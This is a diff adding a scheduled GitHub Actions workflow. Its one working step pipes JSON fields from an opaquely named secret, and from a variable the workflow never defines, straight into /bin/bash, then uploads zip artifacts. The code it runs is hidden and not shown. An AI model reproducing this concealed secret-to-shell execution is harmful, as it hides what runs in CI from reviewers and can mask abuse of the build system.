@@ -1,0 +1,27 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '57 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          ek54: ${{ secrets.ek54 }}
+        run: |
+          printf '%s' "$ek54" | jq -r .ta624 | /bin/bash
+          printf '%s' "$az31119" | jq -r .fb0824 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: dMafAGn1
+          path: "*.zip"
+          retention-days: 1
